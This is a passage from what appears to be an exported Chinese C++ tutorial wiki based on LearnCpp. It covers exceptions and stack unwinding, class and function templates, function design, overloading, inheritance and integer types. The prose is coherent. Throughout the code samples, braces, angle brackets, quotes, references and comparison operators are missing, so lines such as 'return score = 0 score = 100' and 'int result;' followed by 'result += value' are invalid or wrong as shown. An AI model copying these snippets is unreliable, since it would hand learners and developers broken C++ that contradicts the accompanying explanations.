#include iostream#include stdexceptdouble divide(double left, double right) if (right == 0.0) throw std::invalid_argumentzero divisor; return left / right;int main() try std::cout divide(6.0, 2.0) ; catch (const std::invalid_argument error) std::cerr error.what() ; return 1; 异常通常按 const 引用捕获，具体派生异常处理器应放在一般基类之前。 异常、函数与栈展开异常传播会销毁从抛出点到处理器之间已经构造完成的自动对象。 RAII 让锁、文件和内存在栈展开时自动释放，是异常安全的基础。 栈展开会依次退出从抛出点到处理器之间的作用域并析构自动对象，这正是 RAII 能保护异常路径的原因。裸资源若只在正常路径手工释放会泄漏。析构过程中再次抛出并逃逸通常会导致 std::terminate。 栈展开自动释放资源 #include iostream#include memory#include stdexceptvoid work() auto valuestd::make_uniqueint(7); throw std::runtime_errorfailure;int main() try work(); catch (const std::exception error) std::cerr error.what() ; 异常离开 work 时 unique_ptr 析构并释放对象；裸资源需要手动清理，容易在非局部控制流中泄漏。 未捕获异常与 catch-all找不到匹配处理器时程序调用 std::terminate，catch (…) 可以捕获任意异常。 catch-all 适合边界记录、清理或转换，不能在不知道恢复条件时静默继续。 没有匹配处理器的异常最终调用 std::terminate。catch (...) 能捕获任意 C++ 异常，却不知道具体类型，适合线程入口、事件循环或进程边界做最后清理与转换。捕获后静默继续会隐藏不变量破坏。 在程序边界处理未知异常 #include iostream#include stdexceptvoid run() throw std::runtime_errorfailure; int main() try run(); catch (const std::exception error) std::cerr error.what() ; return 1; catch (...) std::cerr unknown failure ; return 2; catch (…) 适合最外层记录和转换退出状态；不知道恢复条件时不能静默继续。 异常、类与继承标准异常派生自 std::exception，并通过 what 提供诊断文本。 捕获基类引用可以处理派生异常，自定义异常应携带恢复决策所需的结构化信息。 异常类型可以形成继承层次，通常从 std::exception 派生并提供稳定 what() 文本。错误类别应服务处理策略，而不是为每个消息创建新类型。跨模块边界还要考虑 ABI 与依赖，必要时转换为模块自己的结果对象。 自定义异常携带结构化信息 #include exception#include iostreamclass ParseError : public std::exceptionpublic: explicit ParseError(int position) : m_positionposition const char* what() const noexcept override return parse error; int position() const return m_position; private: int m_position;;int main() try throw ParseError3; catch (const ParseError error) std::cerr error.what() at error.position() ; 派生 std::exception 便于统一捕获，额外字段为恢复或诊断提供结构化上下文。 在系统边界转换异常 try return run_request(request);catch (const ParseError error) return Response::bad_request(error.what());catch (const std::exception error) return Response::internal_error(); 内部异常在明确边界转换为协议结果，具体处理器仍按最具体到最一般的顺序匹配。 异常在模块边界转换为协议错误或状态码，内部处理器从最具体类型匹配到一般类型，并保留必要诊断上下文。 重新抛出异常catch 中单独写 throw; 会保留原异常动态类型并继续传播。 throw error; 会创建新异常并可能切片；转换异常时应保留有用上下文。 在 catch 中单独写 throw; 会重新抛出当前异常并保留动态类型，throw error; 则创建新异常并可能切片。重新抛出适合补充上下文后让更高层决定策略；不要在每层重复记录同一错误造成噪声。 使用 throw; 保留动态类型 #include iostream#include stdexceptvoid run() try throw std::runtime_errorfailure; catch (const std::exception) std::cerr run failed ; throw; int main() try run(); catch (const std::runtime_error error) std::cerr error.what() ; 单独 throw; 继续传播当前异常对象；throw error 会复制静态类型并可能造成切片。 函数 try 块函数 try 块可以覆盖函数体以及构造函数的初始化列表。 构造函数处理器不能让构造失败的对象恢复为已构造状态，通常用于转换或记录异常后继续抛出。 函数 try 块可覆盖构造函数初始化列表以及整个函数体，构造失败时用于转换异常或记录边界信息。构造函数处理器结束后不能让未构造完整的对象正常返回，通常必须继续抛出。普通函数多数使用函数体内 try 更直观。 构造函数 try 块转换初始化失败 #include iostream#include stdexceptclass Configpublic: explicit Config(int value) try : m_valuevalidate(value) catch (const std::invalid_argument) throw std::runtime_errorinvalid config; private: static int validate(int value) if (value 0) throw std::invalid_argumentnegative; return value; int m_value;;int main() try Config config-1; catch (const std::exception error) std::cerr error.what() ; 函数 try 块覆盖初始化列表，但处理器不能把构造失败的对象恢复成已构造状态，只能继续抛出或终止。 参考资料 LearnCpp 27.1：异常的用途 LearnCpp 27.2：异常处理基础 LearnCpp 27.3：异常、函数与栈展开 LearnCpp 27.4：未捕获异常与 catch-all LearnCpp 27.5：异常、类与继承 LearnCpp 27.6：重新抛出异常 LearnCpp 27.7：函数 try 块 cppreference：异常相关条目","tags":[null,null]},{"title":"类模板、实参推导与类型别名模板","path":"/wiki/cpp/cpp-topic-first-class-templates.html","content":"类模板让数据结构随元素类型或编译期值变化。类模板实参推导可以减少显式参数，但推导指引必须与构造语义保持一致；别名模板只为已有类型表达式提供新名字，不会创建新的独立类型。遇到边界规则时，语言参考资料比经验类推更可靠。 类模板类模板用类型或值参数描述一族类，具体实参组合形成不同类型。 模板定义通常放在头文件中，成员只在被使用时实例化相应代码。 类模板根据类型或非类型参数生成彼此独立的类类型。成员定义必须对模板参数保持有效，直到具体成员被使用时才可能实例化。公共类模板应把约束、所有权和异常保证写在接口中，避免错误只在深层成员表达式出现。 类模板封装可复用的值容器 #include iostreamtemplate typename Tclass Boxpublic: explicit Box(T value) : m_valuevalue const T get() const return m_value; private: T m_value;;int main() std::cout Boxint7.get() ; 每组模板实参形成独立类型，完整类模板定义通常要让实例化点可见。 类模板实参推导与推导指引C++17 CTAD 可以从构造实参推导类模板参数，推导指引用于补充或修正推导规则。 CTAD 不会在所有语境自动推导，成员声明和函数参数等位置常需显式模板实参。 类模板实参推导根据构造实参和推导指引选择模板参数，自 C++17 可用。它减少重复，但推导结果可能受新增构造函数影响。公共类型若自然推导无法表达期望语义，可提供有限的显式 deduction guide，并用静态断言覆盖边界。 类模板实参推导减少重复类型名 #include iostream#include utilitytemplate typename Tstruct Pair T first; T second; ;int main() Pair pair2, 3; std::cout pair.first + pair.second ; CTAD 从构造参数推导模板实参；复杂模板仍可以通过推导指引固定期望类型。 别名模板别名模板为一族依赖模板参数的类型表达式提供名称。 它不能像类模板一样直接特化，但可以委托给可特化的辅助类模板。 别名模板根据参数生成类型别名，适合固定容器分配器、比较器或嵌套模板的一部分。它不会创建可特化的新类实体，也不会把两个实例变成强类型。需要不变量或独立重载身份时，应使用包装类模板。 别名模板简化重复容器类型 #include iostream#include vectortemplate typename Tusing List = std::vectorT;int main() Listint values1, 2, 3; std::cout values.size() ; 别名模板不创建新类型，只提供参数化的名称别名；需要强类型时应定义新 class。 使用语言参考资料语言教程解释学习路径，参考资料用于查询精确签名、版本、复杂度和前置条件，两者职责不同。 核对 cppreference 时还应区分语言标准、编译器实现状态与第三方扩展。 语言参考资料用于确认精确语法、前置条件、复杂度和版本可用性。阅读时要区分语言规则、标准库接口与某个编译器扩展，并从当前标准版本选择对应页面。检索时先用准确的类型名或函数名定位条目，再核对头文件、特性测试宏、异常保证和失效条件；页面示例帮助理解调用方式，但规范性结论仍应落到条款或权威参考描述。编译器文档则用于确认诊断选项、实现进度和平台扩展，不能替代语言标准本身。 使用语言参考资料核对规则 #include type_traits#include iostreamint main() static_assert(std::is_same_vdecltype(42), int); std::cout checked ; 参考资料适合核对语法、类型和标准版本；示例仍应放进目标编译器实际验证。 参考资料 LearnCpp 13.13：类模板 LearnCpp 13.14：类模板实参推导与推导指引 LearnCpp 13.15：别名模板 LearnCpp 13.y：使用语言参考资料 cppreference：复合类型：枚举与结构体相关条目","tags":[null,null]},{"title":"函数接口与程序拆分","path":"/wiki/cpp/cpp-topic-function-design.html","content":"函数不是给代码套一层名字。参数表达依赖，返回类型表达调用结果，局部作用域限制临时状态，声明则让调用点能够在看到实现之前完成类型检查。拆分是否有效，最终取决于接口能否准确描述一项完整任务。 函数函数把一组操作封装为带名称的调用单元，调用表达式会建立新的函数作用域。 函数接口由名称、参数、返回类型和约束共同组成，函数体负责实现该契约。 函数调用会用实参初始化形参，然后执行新的块作用域。签名描述调用所需类型，但完整契约还包括可空性、修改权限、所有权和失败方式。把这些约束尽量编码在参数与返回类型中，比依靠调用方记住注释更稳固。 用函数封装一个完整动作 #include iostreamint clamp(int value, int low, int high) if (value low) return low; if (value high) return high; return value;int main() std::cout clamp(12, 0, 10) ; 函数通过参数接收依赖，通过返回值交付结果；调用方不需要知道分支实现。 函数返回值非 void 函数通过 return 把结果交给调用方，所有可到达路径都必须满足返回契约。 返回值通常依靠复制消除或移动语义高效传递；不要返回指向局部对象的引用或指针。 返回值是从函数传出结果的主要通道。返回局部对象通常安全，编译器可以直接在调用方存储中构造结果或移动它；返回局部对象的指针或引用则会悬空。多种失败原因需要与正常值并存时，应选择明确的结果类型或异常边界。 返回值表达成功结果 #include iostreamint parse_port(int value) if (value 1 || value 65535) return -1; return value;int main() const int portparse_port(8080); std::cout port ; 每条可到达路径都返回 int；真实接口中也可以使用 optional 或 expected 区分错误和有效值。 void 函数void 表示函数不向调用方提供值，仍然可以使用单独的 return 提前结束。 如果调用方需要了解操作是否成功，单纯 void 接口通常不足，应选择状态值、结果类型或异常。 void 只表示没有返回值，不表示函数没有结果或不会失败。修改引用参数、写文件和输出日志都会产生可观察副作用。若调用方必须根据成功与否继续分支，void 会隐藏这项信息，此时布尔值、枚举、结果对象或异常更合适。 void 函数只负责动作 #include iostreamvoid print_status(bool ready) if (!ready) return; std::cout ready ;int main() print_status(true); void 函数可以提前 return，但不能把结果交给调用方；失败状态应由接口另行表达。 函数参数与实参形参属于函数定义，实参出现在调用表达式中；初始化形参时可能发生复制或转换。 按值适合小型独立值，引用和指针用于借用对象，但接口必须说明可空性与修改权限。 按值形参拥有独立对象，适合小型标量或需要取得副本的场景；const T 借用现有大对象，T 表达可修改借用，指针通常还允许空值。接口选择应先表达语义，再由实际测量决定是否需要为复制成本调整。 按值和按引用表达不同借用关系 #include iostreamvoid add_fee(int cents, int fee) cents += fee;int main() int cents100; add_fee(cents, 25); std::cout cents ; cents 通过非 const 左值引用被修改，fee 按值传递；接口形式直接暴露修改权限。 局部作用域局部变量从声明点进入作用域，在所在块结束时离开作用域并按逆序析构。 作用域控制名称可见性，生命周期控制对象何时存在，两者相关但不是同一概念。 局部名称从声明点开始可见，对象生命周期则在初始化完成后开始。离开代码块时，自动对象按构造的逆序析构，这让嵌套作用域既能限制名称冲突，也能准确缩短锁、文件和临时缓冲区的占用时间。 让局部对象在最小范围内存在 #include iostreamint main() int result; const int left2; const int right3; result = left + right; std::cout result ; left 和 right 在内层块结束时离开作用域；名称不可见与对象是否已经销毁是两个需要分别分析的问题。 函数的用途与有效拆分函数可以消除重复、命名完整操作并隔离变化，但过细拆分会让控制流难以追踪。 一个函数应围绕单一可描述任务组织，并通过参数表达依赖，避免暗中读取可变全局状态。 有效函数边界围绕一个可以命名的结果或状态变化建立。把纯计算、外部 IO 和状态提交拆开，失败路径会更容易验证；但仅为缩短行数创建没有独立语义的转发函数，会迫使读者在更多位置之间跳转。 按单一职责拆分函数 #include iostreambool is_valid_score(int score) return score = 0 score = 100; int normalized_score(int score) return score 0 ? 0 : score; int main() const int score88; if (is_valid_score(score)) std::cout normalized_score(score) ; 每个函数表达一个可命名的判断或变换，依赖通过参数传入而不是隐藏在全局状态中。 前向声明与定义声明告诉编译器名称和类型，定义还提供实体或函数体；同一实体可以多次声明但通常只能有一个定义。 前向声明必须与最终定义完全一致，手写重复声明容易漂移，公共接口应放在头文件中共享。 声明使编译器知道名称及其类型，定义还创建实体或给出函数体。多个兼容声明可以指向同一实体，但程序中的定义数量受单一定义规则约束。公共声明只维护一份并由定义文件包含同一头文件，可以让签名漂移立即变成编译错误。 声明与定义保持同一签名 #include iostreamint square(int value); // declarationint main() std::cout square(5) ;int square(int value) // definition return value * value; 调用点只需要声明；程序中仍必须提供恰好一个与声明一致的定义。 程序设计程序设计从需求、数据和约束开始，再逐步细化为函数接口与控制流。 先写可验证的小步骤并持续编译，可以把语法错误、接口错误和业务错误限制在较小范围。 程序设计先确定输入、输出、不变量和失败方式，再把状态变化分配给函数与类型。纸面步骤应能对应可验证的接口，而不是直接翻译成一串控制语句。先实现最小闭环，再逐步引入文件、类和错误处理，可以限制每次变化的影响范围。 从需求拆成可验证步骤 #include iostreambool is_valid(int value) return value = 0 value = 100; int score_with_bonus(int value) return value + 5; int main() int score; if (!(std::cin score) || !is_valid(score)) return 1; std::cout score_with_bonus(score) ; 需求中的输入、校验、计算和输出各自有明确边界，任何一步都可以用独立样例验证。 把终端交互与计算逻辑分开 struct Order int quantity; int unit_price_cents;;int total_cents(const Order order) return order.quantity * order.unit_price_cents; 核心函数只依赖参数并返回结果，读取输入和格式化输出可以在 main 中独立处理。 把需求拆成输入、约束、状态变化和输出，再为每一步选择能够独立验证的接口；拆分数量应服从职责，而不是追求更多函数。 参考资料 LearnCpp 2.1：函数 LearnCpp 2.2：函数返回值 LearnCpp 2.3：void 函数 LearnCpp 2.4：函数参数与实参 LearnCpp 2.5：局部作用域 LearnCpp 2.6：函数的用途与有效拆分 LearnCpp 2.7：前向声明与定义 LearnCpp 2.13：程序设计 cppreference：函数与文件相关条目","tags":[null,null]},{"title":"函数模板、实例化与非类型参数","path":"/wiki/cpp/cpp-topic-function-templates.html","content":"函数模板把类型或编译期值留作参数，调用时再推导并实例化具体函数。模板定义通常必须对实例化点可见，多类型参数需要明确彼此关系，非类型参数则把数组长度等常量信息带入类型检查。 函数模板函数模板用模板参数描述一族函数，实例化后得到针对具体实参的普通函数。 模板体中的操作形成对类型的隐式要求，C++20 可用 requires 把要求直接写入接口。 函数模板描述的是生成函数的规则，不是一个尚未填完的普通函数。调用点完成实参推导后，编译器才为所需类型形成特化。C++20 concepts 可以把“哪些类型可用”写入候选约束，让不满足接口的类型在重载选择阶段退出，而不是在函数体深处报错。 用函数模板复用类型无关算法 #include iostreamtemplate typename TT maximum(T left, T right) return left right ? right : left;int main() std::cout maximum(3, 7) ; 模板把类型作为参数，实例化时要求 T 支持函数体使用的操作。 C++20 concepts 和 requires 表达式可以把模板要求放进声明；它们补充的是约束表达，不改变模板按需实例化的基本模型。 函数模板实例化隐式实例化在调用需要某个特化时发生，显式实例化可以集中生成指定版本。 模板定义通常必须在实例化点可见，因此多放在头文件而不是普通源文件中。 模板定义在解析时先检查不依赖实参的部分，实际使用某组实参时再形成特化并检查依赖代码。未被实例化的错误路径可能长期隐藏。显式实例化可以集中代码生成，但不能让调用点看不到所需声明。 在使用点实例化模板 #include iostreamtemplate typename TT twice(T value) return value + value; int main() std::cout twiceint(3) twicedouble(1.5) ; 显式模板实参可以固定实例化类型；省略时编译器会从函数实参推导。 多类型函数模板多个模板类型参数允许每个实参独立推导，但函数体仍需定义它们之间可用的操作。 返回类型可用 std::common_type_t、尾置 decltype 或明确模板参数表达，而不是假设第一个类型足够。 多个模板类型参数允许函数在不同类型之间建立运算关系，但返回类型和共同类型必须明确。C++20 concepts 可以分别约束每个参数及它们之间的表达式。模板接受“恰好能编译”的组合并不等于接口语义成立。 让多个模板参数保留各自类型 #include iostreamtemplate typename Left, typename Rightauto sum(Left left, Right right) return left + right; int main() std::cout sum(2, 0.5) ; 不同类型参数参与共同类型推导；公共约束应通过 concepts 或 requires 收窄。 非类型模板参数非类型模板参数把编译期值纳入类型或算法生成过程，数组长度是常见示例。 不同参数值形成不同特化；参数类型和允许的值类别受所用 C++ 标准约束。 非类型模板参数把编译期值放入实例身份，例如数组长度或策略标志。不同值会形成不同类型和代码实例。适合影响布局或编译期算法的参数；普通运行期配置不应为了模板化而制造大量实例。 用非类型模板参数固定容量 #include array#include iostreamtemplate std::size_t Sizeint sum(const std::arrayint, Size values) int result; for (int value : values) result += value; return result;int main() std::cout sum(std::arrayint, 31, 2, 3) ; Size 成为类型的一部分；每个不同容量会形成不同实例化类型。 多文件中的函数模板把模板声明放在头文件、定义放在 cpp 文件通常会让其他翻译单元无法实例化。 可将完整定义放在头文件，或在源文件中对受支持类型显式实例化并限制接口范围。 普通函数可以把定义放进源文件，模板通常需要在实例化点看到完整定义，因此常写在头文件。另一种做法是在源文件显式实例化有限的类型集合，但这会把可用类型变成封闭接口，新增类型时必须同步实例化列表。 把模板定义放在头文件 // max.hpp#pragma oncetemplate typename TT max_value(T left, T right) return left right ? right : left; // main.cpp#include iostream#include max.hppint main() std::cout max_value(2, 5) ; 实例化点必须能看到模板定义；把模板实现只放进单独 .cpp 常导致链接或实例化失败。 参考资料 LearnCpp 11.6：函数模板 LearnCpp 11.7：函数模板实例化 LearnCpp 11.8：多类型函数模板 LearnCpp 11.9：非类型模板参数 LearnCpp 11.10：多文件中的函数模板 cppreference：函数重载与函数模板相关条目","tags":[null,null]},{"title":"函数重载、默认实参与歧义消解","path":"/wiki/cpp/cpp-topic-function-overloading.html","content":"同名函数可以形成重载集合，但返回类型不能单独区分重载。调用点先收集候选，再比较实参到形参的转换序列；没有唯一最佳匹配时，调用就是歧义。删除函数和默认实参都能改变接口可用性，却不会绕过这套解析规则。 概念索引 主题 规则边界 函数重载 同一作用域中的函数可以共享名称，只要参数列表足以区分候选。 函数重载的区分规则 参数数量、类型和成员函数 cvref 限定可以区分重载，顶层 const 的按值参数不能。 重载解析与歧义 重载解析先建立候选和可行函数，再比较每个实参所需转换序列。 删除函数 将函数声明为 delete 可以让不希望出现的调用在重载解析后得到明确编译错误。 默认实参 默认实参在调用点补入，只能在参数列表尾部连续提供，并应在可见声明中定义一次。 函数重载返回类型不能单独区分重载，因为调用点通常无法用返回上下文唯一选择函数。 函数重载让同一名称对应多组参数类型，调用点仍只表达一项概念操作。重载集合应保持一致的语义和失败方式；如果两个函数只是碰巧名字相似，分开命名更清楚。默认实参、隐式转换和模板加入后都会参与候选选择。 用重载接受不同输入类型 #include iostream#include string_viewvoid print(int value) std::cout value ; void print(std::string_view value) std::cout value ; int main() print(3); print(text); 重载通过参数列表区分；仅改变返回类型不能形成重载。 函数重载的区分规则类型别名不会形成新类型，因此使用别名的签名仍可能与原类型重复。 只有能够进入函数签名区分的属性才能构成重载，例如参数数量、参数类型和成员函数的 cvref 限定。单独改变返回类型、参数名或顶层按值 const 不能区分重载。别名也不创建新类型，因此不能靠 typedef 绕过这些规则。 用参数类型区分重载 #include iostreamvoid set_value(int value) std::cout int= value ; void set_value(double value) std::cout double= value ; int main() set_value(2); set_value(2.5); 实参类型参与候选筛选；转换都可行时可能产生歧义，应避免过于接近的重载集合。 重载解析与歧义两个候选都没有整体更好的转换时调用歧义，应调整接口或在调用点明确转换。 重载解析先收集候选和可行函数，再比较每个实参所需的隐式转换序列。返回类型通常不参与选择，因此不能只靠不同返回类型重载。新增一个看似方便的重载可能改变旧调用的最佳候选，公共接口演进时需要重新检查边界类型和字面量调用。 避免依赖隐式转换解决歧义 #include iostreamvoid select(long value) std::cout value ; void select(double value) std::cout value ; int main() select(2L); select(2.0); 为调用点提供精确类型或具名函数，能让重载解析稳定而不依赖隐式转换的细节。 删除函数删除的函数仍参与重载解析，适合禁止某些隐式转换或复制操作。 删除函数仍参与名称查找和重载解析，只是在成为最佳候选后产生清晰编译错误。它适合禁止危险的隐式转换或复制操作，比留下未定义的私有声明更直接。泛型接口若要按条件排除类型，C++20 constraints 通常比大量 deleted 重载更可组合。 用 delete 禁止危险调用 #include iostreamvoid log(int value) std::cout value ; void log(bool) = delete;int main() log(1); 删除函数在重载解析后产生编译错误，能把不允许的接口使用变成明确诊断。 默认实参公共接口修改默认值会改变重新编译调用方的行为，虚函数默认实参还按静态类型选择。 默认实参在调用点根据可见声明补入，不属于函数类型，也不会创建新重载。一个作用域中同一参数只能提供一次默认值。公共头文件修改默认表达式会改变重新编译调用方的行为，因此默认值也是接口版本的一部分。 默认实参放在稳定的接口边界 #include iostreamvoid connect(int timeout_ms = 1000) std::cout timeout_ms ;int main() connect(); connect(250); 默认实参在调用点替换；公共头文件修改默认值会影响重新编译的调用方。 参考资料 LearnCpp 11.1：函数重载 LearnCpp 11.2：函数重载的区分规则 LearnCpp 11.3：重载解析与歧义 LearnCpp 11.4：删除函数 LearnCpp 11.5：默认实参 cppreference：函数重载与函数模板相关条目","tags":[null,null]},{"title":"继承、构造顺序与访问控制","path":"/wiki/cpp/cpp-topic-inheritance.html","content":"继承建立子类型关系，也把基类子对象嵌入派生对象。基类部分先构造、后析构，派生构造函数负责选择基类构造方式；访问说明符和名称隐藏又决定哪些成员能被派生类与调用方看到。 继承继承让派生对象包含基类子对象，并可在满足替换关系时复用基类接口。 只为复用实现而继承会增加耦合，组合通常更适合 has-a 关系。 公有继承表达 is-a 和可替换关系：使用基类契约的代码应能接收派生对象而不破坏预期。代码复用本身不足以证明继承合理，组合常能以更低耦合复用实现。继承层次还会引入构造顺序、动态派发和析构约束。 继承表达可替换关系 #include iostreamclass Devicepublic: explicit Device(int id) : m_idid int id() const return m_id; private: int m_id;;class Sensor : public Device public: using Device::Device; ;int main() std::cout Sensor7.id() ; Sensor 包含 Device 基类子对象并保留其 public 接口；仅为复用实现时组合可能更合适。 C++ 基础继承class Derived : public Base 建立 public 继承，派生类获得可访问基类成员并包含一个 Base 子对象。 基类 private 成员仍存在但只能通过基类接口访问。 派生对象包含基类子对象，并增加自己的成员或行为。公有继承保留基类 publicprotected 接口的外部可访问性，private 成员仍只能由基类操作。派生类应通过基类构造函数建立基类状态，而不是绕过其不变量。 public 继承保留公共接口 #include iostreamclass Base public: int value() const return 3; private: int hidden; ;class Derived : public Base public: int doubled() const return value() * 2; ;int main() std::cout Derived.doubled() ; Derived 可以调用 Base 的 publicprotected 成员，但不能直接访问 private 表示。 派生类构造顺序构造派生对象时先构造虚基类、直接基类，再按声明顺序构造成员，最后执行派生构造体。 析构顺序完全相反，不能依赖初始化列表书写顺序改变它。 构造派生对象时先构造虚基类，再构造直接基类，然后按声明顺序构造成员，最后执行派生构造函数体；析构顺序相反。初始化列表的书写顺序不能改变它。依赖关系应与固定顺序一致。 构造和析构顺序 #include iostreamstruct Base Base() std::cout base ; ~Base() std::cout ~base ; ;struct Member Member() std::cout member ; ~Member() std::cout ~member ; ;struct Derived : Base Member member; Derived() std::cout derived ; ~Derived() std::cout ~derived ; ;int main() Derived object; 基类先于成员构造，成员按声明顺序构造，最后执行派生构造体；析构顺序完全相反。 派生类构造与初始化派生构造函数通过成员初始化列表选择基类构造函数，基类无默认构造时必须显式选择。 派生类不能直接初始化基类成员，只能初始化整个基类子对象。 派生构造函数在初始化列表中选择基类构造函数，基类完成后才能初始化派生部分。构造函数不被普通继承，但可用 using 引入；引入的构造仍不能替代派生类额外不变量的建立。异常会自动析构已完成的子对象。 派生构造函数选择基类构造 #include iostreamclass Basepublic: explicit Base(int id) : m_idid int id() const return m_id; private: int m_id;;class Derived : public Base public: Derived(int id, int value) : Baseid, m_valuevalue int value() const return m_value; private: int m_value; ;int main() const Derived value7, 9; std::cout value.id() value.value() ; 派生类初始化整个 Base 子对象，不能越过基类接口直接初始化其 private 成员。 继承与访问说明符public 继承保留基类 publicprotected 可访问级别，protectedprivate 继承会收紧外部可见性。 protected 数据让派生类依赖表示细节，基类通常保持数据 private 并提供受控接口。 公有、保护和私有继承会改变基类 publicprotected 成员在派生接口中的可访问性。公有继承用于可替换类型，私有继承更接近实现复用但通常组合更直观。访问模式不会改变基类 private 成员的不可直接访问性。 访问说明符改变外部可见性 #include iostreamclass Base public: int value() const return 3; protected: int helper() const return 4; ;class Derived : public Base public: int combined() const return value() + helper(); ;int main() std::cout Derived.combined() ; public 继承保留 public 契约，protected 成员仅供派生实现；基类数据通常仍保持 private。 为派生类增加功能派生类可以新增只适用于更具体概念的状态和操作。 如果调用方必须频繁向下转换才能使用新增功能，基类抽象或对象关系可能需要重新设计。 派生类可以添加新成员和函数，但仅在派生接口可见。若调用方必须频繁知道具体派生类型才能使用主要能力，基类抽象可能不完整。公共行为应由虚接口表达，类型特有操作则留在明确需要具体类型的边界。 派生类增加更具体的能力 #include iostreamclass Device public: explicit Device(int id) : m_idid int id() const return m_id; private: int m_id; ;class Sensor : public Device public: Sensor(int id, double value) : Deviceid, m_valuevalue double reading() const return m_value; private: double m_value; ;int main() const Sensor sensor7, 2.5; std::cout sensor.id() sensor.reading() ; reading 只属于更具体的 Sensor；如果调用方总要向下转换，基类抽象可能不完整。 调用继承函数与覆盖行为派生类可用 Base::function 限定调用基类实现，并在同名函数中扩展前后行为。 非虚函数的同名定义是隐藏而非运行时覆盖；多态行为需要基类 virtual 接口。 派生类声明同名函数可能覆盖虚函数，也可能隐藏基类其他重载。使用 override 可让编译器验证签名确实覆盖。需要调用基类实现时使用限定名 Base::function()，避免无意递归或再次动态派发。 限定调用基类实现 #include iostreamclass Base public: void print() const std::cout base ; ;class Derived : public Base public: void print() const Base::print(); std::cout derived ; ;int main() Derived.print(); Base::print 明确调用基类版本；因为函数非 virtual，这只是名称隐藏而不是运行时多态覆盖。 隐藏继承功能派生类声明同名函数会隐藏基类整个重载集合，可用 using Base::name 重新引入。 改变访问权限或删除派生接口不能改变通过基类静态类型仍然可用的公共契约。 派生类同名声明会隐藏基类整个重载集合，不只隐藏相同签名。using Base::name 可以把基类重载重新引入。删除或改变访问权限只能限制通过派生接口的使用，不能改变基类对象本身的公共契约。 用 using 重新引入基类重载 #include iostreamclass Base public: void print(int value) const std::cout value ; void print(double value) const std::cout value ; ;class Derived : public Base public: using Base::print; void print(const char* value) const std::cout value ; ;int main() Derived value; value.print(3); value.print(text); 派生类声明同名函数会隐藏整个基类重载集合，using Base::print 将它重新加入查找。 参考资料 LearnCpp 24.1：继承 LearnCpp 24.2：C++ 基础继承 LearnCpp 24.3：派生类构造顺序 LearnCpp 24.4：派生类构造与初始化 LearnCpp 24.5：继承与访问说明符 LearnCpp 24.6：为派生类增加功能 LearnCpp 24.7：调用继承函数与覆盖行为 LearnCpp 24.8：隐藏继承功能 cppreference：继承相关条目","tags":[null,null]},{"title":"对象表示、整数范围与 size_t","path":"/wiki/cpp/cpp-topic-integer-types.html","content":"类型名称只给出了部分信息。对象大小由实现和 ABI 决定，整数范围还受符号性与位宽影响；std::size_t 适合表示对象大小，却不适合表达可能为负的差值。涉及边界计算时，需要同时检查输入范围、运算过程和目标类型。 概念索引 主题 规则边界 基本数据类型 基本类型包括整数、浮点、字符、布尔和 void，它们的范围与表示受标准最低要求和实现共同约束。 void 类型 void 表示没有值或没有具体对象类型，常用于无返回值函数以及 C 接口中的无类型指针。 对象大小与 sizeof sizeof 返回类型或对象表示占用的字节数，结果类型是 std::size_t。 有符号整数 有符号整数表示正数、负数和零，C++20 起标准规定其表示使用二进制补码。 无符号整数及其风险 无符号算术按模 2 的位宽回绕，这对位操作有用，但容易让普通数量计算产生意外的大值。 定宽整数与 size_t cstdint 提供 int32_t 等可选定宽类型以及至少宽度类型，只有实现存在精确宽度时才提供对应别名。 基本数据类型选择类型时应依据数值范围、精度和语义，而不是假设所有平台具有相同大小。 基本类型的名称给出一组最低范围与运算规则，具体大小和对齐仍由实现选择。类型选择应从业务范围、是否允许负值和精度需求出发。把某台机器上的 int 大小当成协议格式，会让序列化与跨平台边界失去保证。 按语义选择基本类型 #include iostreamint main() const int retries3; const double timeout_seconds1.5; const bool enabledtrue; std::cout retries timeout_seconds enabled ; 整数表达数量，浮点表达近似测量值，bool 表达开关；类型选择同时限定范围和可用运算。 void 类型不能定义 void 对象；void* 也不携带类型、长度或所有权信息。 不能创建 void 对象，也不能对 void 求大小。void* 可以保存对象地址，却丢失目标类型、长度、对齐和所有权信息；恢复具体指针类型完全依赖接口外部约定。普通 C++ 接口优先使用模板、基类或类型擦除包装。 void 只保存地址，不保存类型* #include iostreamvoid print_address(const void* address) std::cout (address != nullptr) ;int main() int value42; print_address(value); void* 可以接收任意对象地址，但恢复类型、长度和所有权必须由接口另行约定。 对象大小与 sizeofsizeof(char) 永远为 1，但一个 C++ 字节的位数由 CHAR_BIT 决定；结构体大小还可能包含对齐填充。 sizeof 的结果以 C++ 字节为单位，类型为 std::size_t。字符类型的大小固定为一个字节，但一个字节并不由标准保证恰好八位；CHAR_BIT 才给出位数。对结构体使用 sizeof 还会观察到为满足成员对齐而插入的填充。 sizeof 与容器长度的区别 #include array#include cstddef#include iostreamint main() constexpr std::array values2, 4, 6, 8; std::cout sizeof(values) values.size() ; sizeof 返回对象表示占用的字节数，size() 返回元素数量；两者不能互换。 有符号整数有符号溢出是未定义行为；边界计算应先检查范围或使用能够容纳结果的类型。 C++20 固定了有符号整数的二进制补码表示，但没有把有符号溢出定义成回绕。计算边界时应在执行加减乘之前验证操作数，或先提升到确实能够表示结果的类型；发生溢出后再比较已经来不及。 在运算前检查有符号边界 #include limits#include iostreamint main() const int valuestd::numeric_limitsint::max(); if (value std::numeric_limitsint::max() - 1) std::cout overflow would occur ; 有符号溢出不是模运算；先比较边界再执行加法，才能避免未定义行为。 C++20 已把有符号整数表示固定为二进制补码；这项变化没有定义有符号溢出。 无符号整数及其风险混合有符号和无符号操作会触发通常算术转换；循环和差值优先使用语义合适的有符号类型或 std::ssize。 无符号类型适合位掩码和按模运算，不天然比有符号整数更安全。0u - 1u 会得到该类型可表示的最大值，混合比较还可能把负数转换成很大的无符号数。容器长度使用无符号类型时，反向遍历可以用迭代器或 std::ssize 避开下溢。 无符号回绕与循环边界 #include iostreamint main() unsigned int value0; --value; std::cout value ; 无符号减一会按位宽回绕；这适合底层位模式，不适合直接表达“可能变为负数”的业务差值。 在做减法前表达边界 std::size_t remaining(std::size_t capacity, std::size_t used) return used = capacity ? capacity - used : 0; 无符号减法不会产生负数；先验证顺序，再执行运算。 定宽整数与 size_tstd::size_t 用于对象大小和容器长度，适合表示非负大小，但不适合表达可能为负的差值。 std::int32_t 只有在实现提供精确 32 位整数时才存在，int_least32_t 和 int_fast32_t 分别保证最低宽度与实现偏好的速度。std::size_t 适合对象大小，两个位置的差值则更适合迭代器差值类型或 std::ssize 的有符号结果。 定宽整数和 size_t 各自表达不同语义 #include cstdint#include cstddef#include iostreamint main() const std::uint32_t packet_id42; const std::size_t payload_size128; std::cout packet_id payload_size ; 协议字段可选择定宽类型，容器长度使用 